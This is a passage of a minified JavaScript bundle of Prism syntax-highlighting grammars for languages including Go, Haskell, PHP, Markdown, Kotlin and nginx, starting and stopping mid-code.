e=j[c],k=h.tokenStack[e],y="string"==typeof z?z:z.content,q=a(f,e),A=y.indexOf(q);if(-1<A){++c;var w=y.substring(0,A),p=new b.Token(f,b.tokenize(k,h.grammar),"language-"+f,k),C=y.substring(A+q.length),x=[];w&&x.push.apply(x,g([w])),x.push(p),C&&x.push.apply(x,g([C])),"string"==typeof z?m.splice.apply(m,[B,1].concat(x)):z.content=x}}else{z.content&&g(z.content)}}return m}(h.tokens)}}}})}(Prism);Prism.languages.git={comment:/^#.*/m,deleted:/^[-–].*/m,inserted:/^\+.*/m,string:/("|')(?:\\.|(?!\1)[^\\\r\n])*\1/m,command:{pattern:/^.*\$ git .*$/m,inside:{parameter:/\s--?\w+/m}},coord:/^@@.*@@$/m,commit_sha1:/^commit \w{40}$/m};Prism.languages.glsl=Prism.languages.extend("clike",{comment:[/\/\*[\s\S]*?\*\//,/\/\/(?:\\(?:\r\n|[\s\S])|[^\\\r\n])*/],number:/(?:\b0x[\da-f]+|(?:\b\d+\.?\d*|\B\.\d+)(?:e[+-]?\d+)?)[ulf]*/i,keyword:/\b(?:attribute|const|uniform|varying|buffer|shared|coherent|volatile|restrict|readonly|writeonly|atomic_uint|layout|centroid|flat|smooth|noperspective|patch|sample|break|continue|do|for|while|switch|case|default|if|else|subroutine|in|out|inout|float|double|int|void|bool|true|false|invariant|precise|discard|return|d?mat[234](?:x[234])?|[ibdu]?vec[234]|uint|lowp|mediump|highp|precision|[iu]?sampler[123]D|[iu]?samplerCube|sampler[12]DShadow|samplerCubeShadow|[iu]?sampler[12]DArray|sampler[12]DArrayShadow|[iu]?sampler2DRect|sampler2DRectShadow|[iu]?samplerBuffer|[iu]?sampler2DMS(?:Array)?|[iu]?samplerCubeArray|samplerCubeArrayShadow|[iu]?image[123]D|[iu]?image2DRect|[iu]?imageCube|[iu]?imageBuffer|[iu]?image[12]DArray|[iu]?imageCubeArray|[iu]?image2DMS(?:Array)?|struct|common|partition|active|asm|class|union|enum|typedef|template|this|resource|goto|inline|noinline|public|static|extern|external|interface|long|short|half|fixed|unsigned|superp|input|output|hvec[234]|fvec[234]|sampler3DRect|filter|sizeof|cast|namespace|using)\b/}),Prism.languages.insertBefore("glsl","comment",{preprocessor:{pattern:/(^[ \t]*)#(?:(?:define|undef|if|ifdef|ifndef|else|elif|endif|error|pragma|extension|version|line)\b)?/m,lookbehind:!0,alias:"builtin"}});Prism.languages.go=Prism.languages.extend("clike",{keyword:/\b(?:break|case|chan|const|continue|default|defer|else|fallthrough|for|func|go(?:to)?|if|import|interface|map|package|range|return|select|struct|switch|type|var)\b/,builtin:/\b(?:bool|byte|complex(?:64|128)|error|float(?:32|64)|rune|string|u?int(?:8|16|32|64)?|uintptr|append|cap|close|complex|copy|delete|imag|len|make|new|panic|print(?:ln)?|real|recover)\b/,"boolean":/\b(?:_|iota|nil|true|false)\b/,operator:/[*\/%^!=]=?|\+[=+]?|-[=-]?|\|[=|]?|&(?:=|&|\^=?)?|>(?:>=?|=)?|<(?:<=?|=|-)?|:=|\.\.\./,number:/(?:\b0x[a-f\d]+|(?:\b\d+\.?\d*|\B\.\d+)(?:e[-+]?\d+)?)i?/i,string:{pattern:/(["'`])(\\[\s\S]|(?!\1)[^\\])*\1/,greedy:!0}}),delete Prism.languages.go["class-name"];Prism.languages.graphql={comment:/#.*/,string:{pattern:/"(?:\\.|[^\\"\r\n])*"/,greedy:!0},number:/(?:\B-|\b)\d+(?:\.\d+)?(?:e[+-]?\d+)?\b/i,"boolean":/\b(?:true|false)\b/,variable:/\$[a-z_]\w*/i,directive:{pattern:/@[a-z_]\w*/i,alias:"function"},"attr-name":{pattern:/[a-z_]\w*(?=\s*(?:\((?:[^()"]|"(?:\\.|[^\\"\r\n])*")*\))?:)/i,greedy:!0},"class-name":{pattern:/(\b(?:enum|implements|interface|on|scalar|type|union)\s+)[a-zA-Z_]\w*/,lookbehind:!0},fragment:{pattern:/(\bfragment\s+|\.{3}\s*(?!on\b))[a-zA-Z_]\w*/,lookbehind:!0,alias:"function"},keyword:/\b(?:enum|fragment|implements|input|interface|mutation|on|query|scalar|schema|type|union)\b/,operator:/[!=|]|\.{3}/,punctuation:/[!(){}\[\]:=,]/,constant:/\b(?!ID\b)[A-Z][A-Z_\d]*\b/};Prism.languages.haskell={comment:{pattern:/(^|[^-!#$%*+=?&@|~.:<>^\\\/])(?:--[^-!#$%*+=?&@|~.:<>^\\\/].*|{-[\s\S]*?-})/m,lookbehind:!0},"char":/'(?:[^\\']|\\(?:[abfnrtv\\"'&]|\^[A-Z@[\]^_]|NUL|SOH|STX|ETX|EOT|ENQ|ACK|BEL|BS|HT|LF|VT|FF|CR|SO|SI|DLE|DC1|DC2|DC3|DC4|NAK|SYN|ETB|CAN|EM|SUB|ESC|FS|GS|RS|US|SP|DEL|\d+|o[0-7]+|x[0-9a-fA-F]+))'/,string:{pattern:/"(?:[^\\"]|\\(?:[abfnrtv\\"'&]|\^[A-Z@[\]^_]|NUL|SOH|STX|ETX|EOT|ENQ|ACK|BEL|BS|HT|LF|VT|FF|CR|SO|SI|DLE|DC1|DC2|DC3|DC4|NAK|SYN|ETB|CAN|EM|SUB|ESC|FS|GS|RS|US|SP|DEL|\d+|o[0-7]+|x[0-9a-fA-F]+)|\\\s+\\)*"/,greedy:!0},keyword:/\b(?:case|class|data|deriving|do|else|if|in|infixl|infixr|instance|let|module|newtype|of|primitive|then|type|where)\b/,import_statement:{pattern:/((?:\r?\n|\r|^)\s*)import\s+(?:qualified\s+)?(?:[A-Z][\w']*)(?:\.[A-Z][\w']*)*(?:\s+as\s+(?:[A-Z][_a-zA-Z0-9']*)(?:\.[A-Z][\w']*)*)?(?:\s+hiding\b)?/m,lookbehind:!0,inside:{keyword:/\b(?:import|qualified|as|hiding)\b/}},builtin:/\b(?:abs|acos|acosh|all|and|any|appendFile|approxRational|asTypeOf|asin|asinh|atan|atan2|atanh|basicIORun|break|catch|ceiling|chr|compare|concat|concatMap|const|cos|cosh|curry|cycle|decodeFloat|denominator|digitToInt|div|divMod|drop|dropWhile|either|elem|encodeFloat|enumFrom|enumFromThen|enumFromThenTo|enumFromTo|error|even|exp|exponent|fail|filter|flip|floatDigits|floatRadix|floatRange|floor|fmap|foldl|foldl1|foldr|foldr1|fromDouble|fromEnum|fromInt|fromInteger|fromIntegral|fromRational|fst|gcd|getChar|getContents|getLine|group|head|id|inRange|index|init|intToDigit|interact|ioError|isAlpha|isAlphaNum|isAscii|isControl|isDenormalized|isDigit|isHexDigit|isIEEE|isInfinite|isLower|isNaN|isNegativeZero|isOctDigit|isPrint|isSpace|isUpper|iterate|last|lcm|length|lex|lexDigits|lexLitChar|lines|log|logBase|lookup|map|mapM|mapM_|max|maxBound|maximum|maybe|min|minBound|minimum|mod|negate|not|notElem|null|numerator|odd|or|ord|otherwise|pack|pi|pred|primExitWith|print|product|properFraction|putChar|putStr|putStrLn|quot|quotRem|range|rangeSize|read|readDec|readFile|readFloat|readHex|readIO|readInt|readList|readLitChar|readLn|readOct|readParen|readSigned|reads|readsPrec|realToFrac|recip|rem|repeat|replicate|return|reverse|round|scaleFloat|scanl|scanl1|scanr|scanr1|seq|sequence|sequence_|show|showChar|showInt|showList|showLitChar|showParen|showSigned|showString|shows|showsPrec|significand|signum|sin|sinh|snd|sort|span|splitAt|sqrt|subtract|succ|sum|tail|take|takeWhile|tan|tanh|threadToIOResult|toEnum|toInt|toInteger|toLower|toRational|toUpper|truncate|uncurry|undefined|unlines|until|unwords|unzip|unzip3|userError|words|writeFile|zip|zip3|zipWith|zipWith3)\b/,number:/\b(?:\d+(?:\.\d+)?(?:e[+-]?\d+)?|0o[0-7]+|0x[0-9a-f]+)\b/i,operator:/\s\.\s|[-!#$%*+=?&@|~.:<>^\\\/]*\.[-!#$%*+=?&@|~.:<>^\\\/]+|[-!#$%*+=?&@|~.:<>^\\\/]+\.[-!#$%*+=?&@|~.:<>^\\\/]*|[-!#$%*+=?&@|~:<>^\\\/]+|`([A-Z][\w']*\.)*[_a-z][\w']*`/,hvariable:/\b(?:[A-Z][\w']*\.)*[_a-z][\w']*\b/,constant:/\b(?:[A-Z][\w']*\.)*[A-Z][\w']*\b/,punctuation:/[{}[\];(),.:]/},Prism.languages.hs=Prism.languages.haskell;!function(l){l.languages.http={"request-line":{pattern:/^(?:POST|GET|PUT|DELETE|OPTIONS|PATCH|TRACE|CONNECT)\s(?:https?:\/\/|\/)\S+\sHTTP\/[0-9.]+/m,inside:{property:/^(?:POST|GET|PUT|DELETE|OPTIONS|PATCH|TRACE|CONNECT)\b/,"attr-name":/:\w+/}},"response-status":{pattern:/^HTTP\/1.[01] \d+.*/m,inside:{property:{pattern:/(^HTTP\/1.[01] )\d+.*/i,lookbehind:!0}}},"header-name":{pattern:/^[\w-]+:(?=.)/m,alias:"keyword"}};var k,j,f,h=l.languages,m={"application/javascript":h.javascript,"application/json":h.json||h.javascript,"application/xml":h.xml,"text/xml":h.xml,"text/html":h.html,"text/css":h.css},c={"application/json":!0,"application/xml":!0};for(var b in m){if(m[b]){k=k||{};var g=c[b]?(void 0,f=(j=b).replace(/^[a-z]+\//,""),"(?:"+j+"|\\w+/(?:[\\w.-]+\\+)+"+f+"(?![+\\w.-]))"):b;k[b]={pattern:RegExp("(content-type:\\s*"+g+"[\\s\\S]*?)(?:\\r?\\n|\\r){2}[\\s\\S]*","i"),lookbehind:!0,inside:{rest:m[b]}}}}k&&l.languages.insertBefore("http","header-name",k)}(Prism);Prism.languages.ini={comment:/^[ \t]*[;#].*$/m,selector:/^[ \t]*\[.*?\]/m,constant:/^[ \t]*[^\s=]+?(?=[ \t]*=)/m,"attr-value":{pattern:/=.*/,inside:{punctuation:/^[=]/}}};!function(f){var c=/\b(?:abstract|continue|for|new|switch|assert|default|goto|package|synchronized|boolean|do|if|private|this|break|double|implements|protected|throw|byte|else|import|public|throws|case|enum|instanceof|return|transient|catch|extends|int|short|try|char|final|interface|static|void|class|finally|long|strictfp|volatile|const|float|native|super|while|var|null|exports|module|open|opens|provides|requires|to|transitive|uses|with)\b/,b=/\b[A-Z](?:\w*[a-z]\w*)?\b/;f.languages.java=f.languages.extend("clike",{"class-name":[b,/\b[A-Z]\w*(?=\s+\w+\s*[;,=())])/],keyword:c,"function":[f.languages.clike["function"],{pattern:/(\:\:)[a-z_]\w*/,lookbehind:!0}],number:/\b0b[01][01_]*L?\b|\b0x[\da-f_]*\.?[\da-f_p+-]+\b|(?:\b\d[\d_]*\.?[\d_]*|\B\.\d[\d_]*)(?:e[+-]?\d[\d_]*)?[dfl]?/i,operator:{pattern:/(^|[^.])(?:<<=?|>>>?=?|->|([-+&|])\2|[?:~]|[-+*/%&|^!=<>]=?)/m,lookbehind:!0}}),f.languages.insertBefore("java","class-name",{annotation:{alias:"punctuation",pattern:/(^|[^.])@\w+/,lookbehind:!0},namespace:{pattern:/(\b(?:exports|import(?:\s+static)?|module|open|opens|package|provides|requires|to|transitive|uses|with)\s+)[a-z]\w*(\.[a-z]\w*)+/,lookbehind:!0,inside:{punctuation:/\./}},generics:{pattern:/<(?:[\w\s,.&?]|<(?:[\w\s,.&?]|<(?:[\w\s,.&?]|<[\w\s,.&?]*>)*>)*>)*>/,inside:{"class-name":b,keyword:c,punctuation:/[<>(),.:]/,operator:/[?&|]/}}})}(Prism);Prism.languages.scala=Prism.languages.extend("java",{keyword:/<-|=>|\b(?:abstract|case|catch|class|def|do|else|extends|final|finally|for|forSome|if|implicit|import|lazy|match|new|null|object|override|package|private|protected|return|sealed|self|super|this|throw|trait|try|type|val|var|while|with|yield)\b/,string:[{pattern:/"""[\s\S]*?"""/,greedy:!0},{pattern:/("|')(?:\\.|(?!\1)[^\\\r\n])*\1/,greedy:!0}],builtin:/\b(?:String|Int|Long|Short|Byte|Boolean|Double|Float|Char|Any|AnyRef|AnyVal|Unit|Nothing)\b/,number:/\b0x[\da-f]*\.?[\da-f]+|(?:\b\d+\.?\d*|\B\.\d+)(?:e\d+)?[dfl]?/i,symbol:/'[^\d\s\\]\w*/}),delete Prism.languages.scala["class-name"],delete Prism.languages.scala["function"];!function(b){b.languages.php=b.languages.extend("clike",{keyword:/\b(?:__halt_compiler|abstract|and|array|as|break|callable|case|catch|class|clone|const|continue|declare|default|die|do|echo|else|elseif|empty|enddeclare|endfor|endforeach|endif|endswitch|endwhile|eval|exit|extends|final|finally|for|foreach|function|global|goto|if|implements|include|include_once|instanceof|insteadof|interface|isset|list|namespace|new|or|parent|print|private|protected|public|require|require_once|return|static|switch|throw|trait|try|unset|use|var|while|xor|yield)\b/i,"boolean":{pattern:/\b(?:false|true)\b/i,alias:"constant"},constant:[/\b[A-Z_][A-Z0-9_]*\b/,/\b(?:null)\b/i],comment:{pattern:/(^|[^\\])(?:\/\*[\s\S]*?\*\/|\/\/.*)/,lookbehind:!0}}),b.languages.insertBefore("php","string",{"shell-comment":{pattern:/(^|[^\\])#.*/,lookbehind:!0,alias:"comment"}}),b.languages.insertBefore("php","comment",{delimiter:{pattern:/\?>$|^<\?(?:php(?=\s)|=)?/i,alias:"important"}}),b.languages.insertBefore("php","keyword",{variable:/\$+(?:\w+\b|(?={))/i,"package":{pattern:/(\\|namespace\s+|use\s+)[\w\\]+/,lookbehind:!0,inside:{punctuation:/\\/}}}),b.languages.insertBefore("php","operator",{property:{pattern:/(->)[\w]+/,lookbehind:!0}});var a={pattern:/{\$(?:{(?:{[^{}]+}|[^{}]+)}|[^{}])+}|(^|[^\\{])\$+(?:\w+(?:\[.+?]|->\w+)*)/,lookbehind:!0,inside:{rest:b.languages.php}};b.languages.insertBefore("php","string",{"nowdoc-string":{pattern:/<<<'([^']+)'(?:\r\n?|\n)(?:.*(?:\r\n?|\n))*?\1;/,greedy:!0,alias:"string",inside:{delimiter:{pattern:/^<<<'[^']+'|[a-z_]\w*;$/i,alias:"symbol",inside:{punctuation:/^<<<'?|[';]$/}}}},"heredoc-string":{pattern:/<<<(?:"([^"]+)"(?:\r\n?|\n)(?:.*(?:\r\n?|\n))*?\1;|([a-z_]\w*)(?:\r\n?|\n)(?:.*(?:\r\n?|\n))*?\2;)/i,greedy:!0,alias:"string",inside:{delimiter:{pattern:/^<<<(?:"[^"]+"|[a-z_]\w*)|[a-z_]\w*;$/i,alias:"symbol",inside:{punctuation:/^<<<"?|[";]$/}},interpolation:a}},"single-quoted-string":{pattern:/'(?:\\[\s\S]|[^\\'])*'/,greedy:!0,alias:"string"},"double-quoted-string":{pattern:/"(?:\\[\s\S]|[^\\"])*"/,greedy:!0,alias:"string",inside:{interpolation:a}}}),delete b.languages.php.string,b.hooks.add("before-tokenize",function(c){if(/<\?/.test(c.code)){b.languages["markup-templating"].buildPlaceholders(c,"php",/<\?(?:[^"'/#]|\/(?![*/])|("|')(?:\\[\s\S]|(?!\1)[^\\])*\1|(?:\/\/|#)(?:[^?\n\r]|\?(?!>))*|\/\*[\s\S]*?(?:\*\/|$))*?(?:\?>|$)/gi)}}),b.hooks.add("after-tokenize",function(c){b.languages["markup-templating"].tokenizePlaceholders(c,"php")})}(Prism);!function(g){function h(j,a){return j=j.replace(/<inner>/g,"(?:\\\\.|[^\\\\\\n\r]|(?:\r?\n|\r)(?!\r?\n|\r))"),a&&(j=j+"|"+j.replace(/_/g,"\\*")),RegExp("((?:^|[^\\\\])(?:\\\\{2})*)(?:"+j+")")}var f="(?:\\\\.|``.+?``|`[^`\r\\n]+`|[^\\\\|\r\\n`])+",c="\\|?__(?:\\|__)+\\|?(?:(?:\r?\n|\r)|$)".replace(/__/g,f),b="\\|?[ \t]*:?-{3,}:?[ \t]*(?:\\|[ \t]*:?-{3,}:?[ \t]*)+\\|?(?:\r?\n|\r)";g.languages.markdown=g.languages.extend("markup",{}),g.languages.insertBefore("markdown","prolog",{blockquote:{pattern:/^>(?:[\t ]*>)*/m,alias:"punctuation"},table:{pattern:RegExp("^"+c+b+"(?:"+c+")*","m"),inside:{"table-data-rows":{pattern:RegExp("^("+c+b+")(?:"+c+")*$"),lookbehind:!0,inside:{"table-data":{pattern:RegExp(f),inside:g.languages.markdown},punctuation:/\|/}},"table-line":{pattern:RegExp("^("+c+")"+b+"$"),lookbehind:!0,inside:{punctuation:/\||:?-{3,}:?/}},"table-header-row":{pattern:RegExp("^"+c+"$"),inside:{"table-header":{pattern:RegExp(f),alias:"important",inside:g.languages.markdown},punctuation:/\|/}}}},code:[{pattern:/(^[ \t]*(?:\r?\n|\r))(?: {4}|\t).+(?:(?:\r?\n|\r)(?: {4}|\t).+)*/m,lookbehind:!0,alias:"keyword"},{pattern:/``.+?``|`[^`\r\n]+`/,alias:"keyword"},{pattern:/^```[\s\S]*?^```$/m,greedy:!0,inside:{"code-block":{pattern:/^(```.*(?:\r?\n|\r))[\s\S]+?(?=(?:\r?\n|\r)^```$)/m,lookbehind:!0},"code-language":{pattern:/^(```).+/,lookbehind:!0},punctuation:/```/}}],title:[{pattern:/\S.*(?:\r?\n|\r)(?:==+|--+)(?=[ \t]*$)/m,alias:"important",inside:{punctuation:/==+$|--+$/}},{pattern:/(^\s*)#+.+/m,lookbehind:!0,alias:"important",inside:{punctuation:/^#+|#+$/}}],hr:{pattern:/(^\s*)([*-])(?:[\t ]*\2){2,}(?=\s*$)/m,lookbehind:!0,alias:"punctuation"},list:{pattern:/(^\s*)(?:[*+-]|\d+\.)(?=[\t ].)/m,lookbehind:!0,alias:"punctuation"},"url-reference":{pattern:/!?\[[^\]]+\]:[\t ]+(?:\S+|<(?:\\.|[^>\\])+>)(?:[\t ]+(?:"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|\((?:\\.|[^)\\])*\)))?/,inside:{variable:{pattern:/^(!?\[)[^\]]+/,lookbehind:!0},string:/(?:"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|\((?:\\.|[^)\\])*\))$/,punctuation:/^[\[\]!:]|[<>]/},alias:"url"},bold:{pattern:h("__(?:(?!_)<inner>|_(?:(?!_)<inner>)+_)+__",!0),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^..)[\s\S]+(?=..$)/,lookbehind:!0,inside:{}},punctuation:/\*\*|__/}},italic:{pattern:h("_(?:(?!_)<inner>|__(?:(?!_)<inner>)+__)+_",!0),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^.)[\s\S]+(?=.$)/,lookbehind:!0,inside:{}},punctuation:/[*_]/}},strike:{pattern:h("(~~?)(?:(?!~)<inner>)+?\\2",!1),lookbehind:!0,greedy:!0,inside:{content:{pattern:/(^~~?)[\s\S]+(?=\1$)/,lookbehind:!0,inside:{}},punctuation:/~~?/}},url:{pattern:h('!?\\[(?:(?!\\])<inner>)+\\](?:\\([^\\s)]+(?:[\t ]+"(?:\\\\.|[^"\\\\])*")?\\)| ?\\[(?:(?!\\])<inner>)+\\])',!1),lookbehind:!0,greedy:!0,inside:{variable:{pattern:/(\[)[^\]]+(?=\]$)/,lookbehind:!0},content:{pattern:/(^!?\[)[^\]]+(?=\])/,lookbehind:!0,inside:{}},string:{pattern:/"(?:\\.|[^"\\])*"(?=\)$)/}}}}),["url","bold","italic","strike"].forEach(function(a){["url","bold","italic","strike"].forEach(function(e){a!==e&&(g.languages.markdown[a].inside.content.inside[e]=g.languages.markdown[e])})}),g.hooks.add("after-tokenize",function(a){"markdown"!==a.language&&"md"!==a.language||!function a(s){if(s&&"string"!=typeof s){for(var p=0,k=s.length;p<k;p++){var m=s[p];if("code"===m.type){var q=m.content[1],u=m.content[3];if(q&&u&&"code-language"===q.type&&"code-block"===u.type&&"string"==typeof q.content){var j="language-"+q.content.trim().split(/\s+/)[0].toLowerCase();u.alias?"string"==typeof u.alias?u.alias=[u.alias,j]:u.alias.push(j):u.alias=[j]}}else{a(m.content)}}}}(a.tokens)}),g.hooks.add("wrap",function(m){if("code-block"===m.type){for(var u="",x=0,w=m.classes.length;x<w;x++){var q=m.classes[x],j=/language-(.+)/.exec(q);if(j){u=j[1];break}}var k=g.languages[u];if(k){var p=m.content.replace(/&lt;/g,"<").replace(/&amp;/g,"&");m.content=g.highlight(p,k,u)}else{if(u&&"none"!==u&&g.plugins.autoloader){var y="md-"+(new Date).valueOf()+"-"+Math.floor(10000000000000000*Math.random());m.attributes.id=y,g.plugins.autoloader.loadLanguages(u,function(){var a=document.getElementById(y);a&&(a.innerHTML=g.highlight(a.textContent,g.languages[u],u))})}}}}),g.languages.md=g.languages.markdown}(Prism);Prism.languages.json={property:{pattern:/"(?:\\.|[^\\"\r\n])*"(?=\s*:)/,greedy:!0},string:{pattern:/"(?:\\.|[^\\"\r\n])*"(?!\s*:)/,greedy:!0},comment:/\/\/.*|\/\*[\s\S]*?(?:\*\/|$)/,number:/-?\d+\.?\d*(e[+-]?\d+)?/i,punctuation:/[{}[\],]/,operator:/:/,"boolean":/\b(?:true|false)\b/,"null":{pattern:/\bnull\b/,alias:"keyword"}};!function(a){a.languages.kotlin=a.languages.extend("clike",{keyword:{pattern:/(^|[^.])\b(?:abstract|actual|annotation|as|break|by|catch|class|companion|const|constructor|continue|crossinline|data|do|dynamic|else|enum|expect|external|final|finally|for|fun|get|if|import|in|infix|init|inline|inner|interface|internal|is|lateinit|noinline|null|object|open|operator|out|override|package|private|protected|public|reified|return|sealed|set|super|suspend|tailrec|this|throw|to|try|typealias|val|var|vararg|when|where|while)\b/,lookbehind:!0},"function":[/\w+(?=\s*\()/,{pattern:/(\.)\w+(?=\s*\{)/,lookbehind:!0}],number:/\b(?:0[xX][\da-fA-F]+(?:_[\da-fA-F]+)*|0[bB][01]+(?:_[01]+)*|\d+(?:_\d+)*(?:\.\d+(?:_\d+)*)?(?:[eE][+-]?\d+(?:_\d+)*)?[fFL]?)\b/,operator:/\+[+=]?|-[-=>]?|==?=?|!(?:!|==?)?|[\/*%<>]=?|[?:]:?|\.\.|&&|\|\||\b(?:and|inv|or|shl|shr|ushr|xor)\b/}),delete a.languages.kotlin["class-name"],a.languages.insertBefore("kotlin","string",{"raw-string":{pattern:/("""|''')[\s\S]*?\1/,alias:"string"}}),a.languages.insertBefore("kotlin","keyword",{annotation:{pattern:/\B@(?:\w+:)?(?:[A-Z]\w*|\[[^\]]+\])/,alias:"builtin"}}),a.languages.insertBefore("kotlin","function",{label:{pattern:/\w+@|@\w+/,alias:"symbol"}});var b=[{pattern:/\$\{[^}]+\}/,inside:{delimiter:{pattern:/^\$\{|\}$/,alias:"variable"},rest:a.languages.kotlin}},{pattern:/\$\w+/,alias:"variable"}];a.languages.kotlin.string.inside=a.languages.kotlin["raw-string"].inside={interpolation:b}}(Prism);!function(b){var c=/\\(?:[^a-z()[\]]|[a-z*]+)/i,f={"equation-command":{pattern:c,alias:"regex"}};b.languages.latex={comment:/%.*/m,cdata:{pattern:/(\\begin\{((?:verbatim|lstlisting)\*?)\})[\s\S]*?(?=\\end\{\2\})/,lookbehind:!0},equation:[{pattern:/\$\$(?:\\[\s\S]|[^\\$])+\$\$|\$(?:\\[\s\S]|[^\\$])+\$|\\\([\s\S]*?\\\)|\\\[[\s\S]*?\\\]/,inside:f,alias:"string"},{pattern:/(\\begin\{((?:equation|math|eqnarray|align|multline|gather)\*?)\})[\s\S]*?(?=\\end\{\2\})/,lookbehind:!0,inside:f,alias:"string"}],keyword:{pattern:/(\\(?:begin|end|ref|cite|label|usepackage|documentclass)(?:\[[^\]]+\])?\{)[^}]+(?=\})/,lookbehind:!0},url:{pattern:/(\\url\{)[^}]+(?=\})/,lookbehind:!0},headline:{pattern:/(\\(?:part|chapter|section|subsection|frametitle|subsubsection|paragraph|subparagraph|subsubparagraph|subsubsubparagraph)\*?(?:\[[^\]]+\])?\{)[^}]+(?=\}(?:\[[^\]]+\])?)/,lookbehind:!0,alias:"class-name"},"function":{pattern:c,alias:"selector"},punctuation:/[[\]{}&]/},b.languages.tex=b.languages.latex,b.languages.context=b.languages.latex}(Prism);Prism.languages.lua={comment:/^#!.+|--(?:\[(=*)\[[\s\S]*?\]\1\]|.*)/m,string:{pattern:/(["'])(?:(?!\1)[^\\\r\n]|\\z(?:\r\n|\s)|\\(?:\r\n|[\s\S]))*\1|\[(=*)\[[\s\S]*?\]\2\]/,greedy:!0},number:/\b0x[a-f\d]+\.?[a-f\d]*(?:p[+-]?\d+)?\b|\b\d+(?:\.\B|\.?\d*(?:e[+-]?\d+)?\b)|\B\.\d+(?:e[+-]?\d+)?\b/i,keyword:/\b(?:and|break|do|else|elseif|end|false|for|function|goto|if|in|local|nil|not|or|repeat|return|then|true|until|while)\b/,"function":/(?!\d)\w+(?=\s*(?:[({]))/,operator:[/[-+*%^&|#]|\/\/?|<[<=]?|>[>=]?|[=~]=?/,{pattern:/(^|[^.])\.\.(?!\.)/,lookbehind:!0}],punctuation:/[\[\](){},;]|\.+|:+/};Prism.languages.makefile={comment:{pattern:/(^|[^\\])#(?:\\(?:\r\n|[\s\S])|[^\\\r\n])*/,lookbehind:!0},string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},builtin:/\.[A-Z][^:#=\s]+(?=\s*:(?!=))/,symbol:{pattern:/^[^:=\r\n]+(?=\s*:(?!=))/m,inside:{variable:/\$+(?:[^(){}:#=\s]+|(?=[({]))/}},variable:/\$+(?:[^(){}:#=\s]+|\([@*%<^+?][DF]\)|(?=[({]))/,keyword:[/-include\b|\b(?:define|else|endef|endif|export|ifn?def|ifn?eq|include|override|private|sinclude|undefine|unexport|vpath)\b/,{pattern:/(\()(?:addsuffix|abspath|and|basename|call|dir|error|eval|file|filter(?:-out)?|findstring|firstword|flavor|foreach|guile|if|info|join|lastword|load|notdir|or|origin|patsubst|realpath|shell|sort|strip|subst|suffix|value|warning|wildcard|word(?:s|list)?)(?=[ \t])/,lookbehind:!0}],operator:/(?:::|[?:+!])?=|[|@]/,punctuation:/[:;(){}]/};Prism.languages.typescript=Prism.languages.extend("javascript",{keyword:/\b(?:abstract|as|async|await|break|case|catch|class|const|constructor|continue|debugger|declare|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|is|keyof|let|module|namespace|new|null|of|package|private|protected|public|readonly|return|require|set|static|super|switch|this|throw|try|type|typeof|var|void|while|with|yield)\b/,builtin:/\b(?:string|Function|any|number|boolean|Array|symbol|console|Promise|unknown|never)\b/}),Prism.languages.ts=Prism.languages.typescript;Prism.languages.nginx=Prism.languages.extend("clike",{comment:{pattern:/(^|[^"{\\])#.*/,lookbehind:!0},keyword:/\b(?:CONTENT_|DOCUMENT_|GATEWAY_|HTTP_|HTTPS|if_not_empty|PATH_|QUERY_|REDIRECT_|REMOTE_|REQUEST_|SCGI|SCRIPT_|SERVER_|http|events|accept_mutex|accept_mutex_delay|access_log|add_after_body|add_before_body|add_header|addition_types|aio|alias|allow|ancient_browser|ancient_browser_value|auth|auth_basic|auth_basic_user_file|auth_http|auth_http_header|auth_http_timeout|autoindex|autoindex_exact_size|autoindex_localtime|break|charset|charset_map|charset_types|chunked_transfer_encoding|client_body_buffer_size|client_body_in_file_only|client_body_in_single_buffer|client_body_temp_path|client_body_timeout|client_header_buffer_size|client_header_timeout|client_max_body_size|connection_pool_size|create_full_put_path|daemon|dav_access|dav_methods|debug_connection|debug_points|default_type|deny|devpoll_changes|devpoll_events|directio|directio_alignment|disable_symlinks|empty_gif|env|epoll_events|error_log|error_page|expires|fastcgi_buffer_size|fastcgi_buffers|fastcgi_busy_buffers_size|fastcgi_cache|fastcgi_cache_bypass|fastcgi_cache_key|fastcgi_cache_lock|fastcgi_cache_lock_timeout|fastcgi_cache_methods|fastcgi_cache_min_uses|fastcgi_cache_path|fastcgi_cache_purge|fastcgi_cache_use_stale|fastcgi_cache_valid|fastcgi_connect_timeout|fastcgi_hide_header|fastcgi_ignore_client_abort|fastcgi_ignore_headers|fastcgi_index|fastcgi_intercept_errors|fastcgi_keep_conn|fastcgi_max_temp_file_size|fastcgi_next_upstream|fastcgi_no_cache|fastcgi_param|fastcgi_pass|fastcgi_pass_header|fastcgi_read_timeout|fastcgi_redirect_errors|fastcgi_send_timeout|fastcgi_split_path_info|fastcgi_store|fastcgi_store_access|fastcgi_temp_file_write_size|fastcgi_temp_path|flv|geo|geoip_city|geoip_country|google_perftools_profiles|gzip|gzip_buffers|gzip_comp_level|gzip_disable|gzip_http_version|gzip_min_length|gzip_proxied|gzip_static|gzip_types|gzip_vary|if|if_modified_since|ignore_invalid_headers|image_filter|image_filter_buffer|image_filter_jpeg_quality|image_filter_sharpen|image_filter_transparency|imap_capabilities|imap_client_buffer|include|index|internal|ip_hash|keepalive|keepalive_disable|keepalive_requests|keepalive_timeout|kqueue_changes|kqueue_events|large_client_header_buffers|limit_conn|limit_conn_log_level|limit_conn_zone|limit_except|limit_rate|limit_rate_after|limit_req|limit_req_log_level|limit_req_zone|limit_zone|lingering_close|lingering_time|lingering_timeout|listen|location|lock_file|log_format|log_format_combined|log_not_found|log_subrequest|map|map_hash_bucket_size|map_hash_max_size|master_process|max_ranges|memcached_buffer_size|memcached_connect_timeout|memcached_next_upstream|memcached_pass|memcached_read_timeout|memcached_send_timeout|merge_slashes|min_delete_depth|modern_browser|modern_browser_value|mp4|mp4_buffer_size|mp4_max_buffer_size|msie_padding|msie_refresh|multi_accept|open_file_cache|open_file_cache_errors|open_file_cache_min_uses|open_file_cache_valid|open_log_file_cache|optimize_server_names|override_charset|pcre_jit|perl|perl_modules|perl_require|perl_set|pid|pop3_auth|pop3_capabilities|port_in_redirect|post_action|postpone_output|protocol|proxy|proxy_buffer|proxy_buffer_size|proxy_buffering|proxy_buffers|proxy_busy_buffers_size|proxy_cache|proxy_cache_bypass|proxy_cache_key|proxy_cache_lock|proxy_cache_lock_timeout|proxy_cache_methods|p